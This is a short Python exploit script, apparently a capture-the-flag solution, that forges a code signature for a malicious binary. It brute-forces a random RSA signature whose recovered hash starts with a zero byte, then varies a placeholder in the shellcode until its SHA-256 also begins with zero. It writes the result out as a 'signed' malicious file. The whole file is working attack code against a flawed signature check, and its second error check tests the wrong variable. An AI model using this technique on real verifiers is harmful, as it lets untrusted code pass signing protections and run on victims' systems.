from hashlib import sha256
import os
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes

def load_mal_code(path):
    f = open(path, "rb")
    content = f.read()
    f.close()
    return content

def load_pub_key(path):
    f = open(path, "rb")
    content = f.read()
    f.close()
    return RSA.importKey(content)

def hash_from_signature(sign, pub):
    m = pow(bytes_to_long(sign), pub.e, pub.n)
    k = (pub.n.bit_length() + 7) // 8
    em = long_to_bytes(m, k)
    return em[-32:]

def find_null_sign(pub, MAXTRY=1000):
    tries = 0
    while tries < MAXTRY:
        tries += 1
        candidate = os.urandom(256)
        result = hash_from_signature(candidate, pub)
        if result[0] == 0:
            return candidate
    
    return None


def nullify_hash(shellcode, repalce=b"AAAAAAAA", MAXTRY=1000):
    junk_index = shellcode.find(repalce)
    junk_len = len(repalce)
    part1 = shellcode[0:junk_index]
    part2 = shellcode[junk_index+junk_len:]
    
    tries = 0
    while tries < MAXTRY:
        tries += 1
        junk = os.urandom(junk_len)
        candidate = part1+junk+part2
        hash = sha256(candidate).digest()
        if hash[0] == 0:
            return candidate
    
    return None

pub_key = load_pub_key("public.pem")

null_sign = find_null_sign(pub_key)
if null_sign == None:
    print("Unable to find the signature, please retry")
    exit(1)

shellcode = load_mal_code("a.out")
null_hash_code = nullify_hash(shellcode)
if null_sign == None:
    print("Unable to nullify the code hash, please retry")
    exit(1)


f = open("malicious_signed.out", "w+b")
f.write(null_hash_code)
f.write(null_sign)
f.close()